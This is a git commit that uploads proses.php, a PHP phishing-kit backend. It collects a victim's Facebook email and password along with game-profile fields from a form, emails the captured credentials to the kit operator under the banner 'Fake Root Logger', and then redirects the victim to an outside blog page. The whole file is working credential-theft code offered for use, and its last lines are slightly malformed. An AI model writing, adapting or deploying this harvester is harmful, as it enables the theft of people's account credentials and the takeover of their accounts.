3fd3e956475a1b26369e814d87de707b9d5c027f
fakeroot76 <71298901+fakeroot76@users.noreply.github.com>
2021-02-07 09:02:27 +0700

    Add files via upload

---
+++ proses.php
@@ -0,0 +1,36 @@
+<?php
+
+
+$nick = $_POST['nickname'];
+$email2 = $_POST['fb1'];
+$pass2 = $_POST['fb2'];
+$lev = $_POST['level'];
+$log = $_POST['login'];
+$ski = $_POST['rank'];
+$emailr= $_POST['elite'];
+$passr= $_POST['passr'];
+
+$message   = "
+
+====[ DATA DATA NYA BRO ]====
+
+• Email  :  ".$email2."
+
+• Password  : ".$pass2."
+
+[ + ] --- ./Fake Root Logger --- [ + ] 
+
+";
+
+include 'email.php';
+$subject = "DATA COK";
+$headers = "From: SETOR DATA <reeditkev@result.net>";
+mail($emailku, $subject, $message, $headers);
+
+$md5      = md5(gmdate("r"));
+$sha1     = sha1(gmdate("r"));
+
+?>
+'<script>window.location.replace("https://fake-root.blogspot.com")</script>';}
+}
+?>
